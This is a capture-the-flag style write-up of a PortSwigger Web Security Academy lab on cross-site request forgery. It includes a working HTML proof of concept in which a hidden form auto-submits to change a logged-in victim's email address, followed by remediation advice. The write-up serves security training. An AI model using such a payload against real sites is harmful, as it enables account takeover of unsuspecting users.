# CSRF – No Defenses

## Lab Information
- **Platform:** PortSwigger Web Security Academy
- **Category:** Cross-Site Request Forgery (CSRF)
- **Lab:** CSRF vulnerability with no defenses

## Description
The lab demonstrates a CSRF vulnerability in an authenticated account email-change function.

## Methodology
1. Logged into the application and inspected the account email-change functionality.
2. Examined the POST request and identified the email parameter.
3. Created an HTML form on the PortSwigger exploit server.
4. Added a hidden email field and JavaScript to automatically submit the form.
5. Delivered the exploit to the lab victim.
6. Verified successful execution through the lab completion message.

## Proof of Concept

```html
<form method="POST" action="https://MY-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

## Impact
An attacker can induce an authenticated victim's browser to change their account email address without the victim intentionally submitting the legitimate form.

## Remediation
- Implement server-side CSRF token validation.
- Configure appropriate `SameSite` cookie attributes.
- Validate the `Origin` header.
- Require additional confirmation for sensitive account changes.
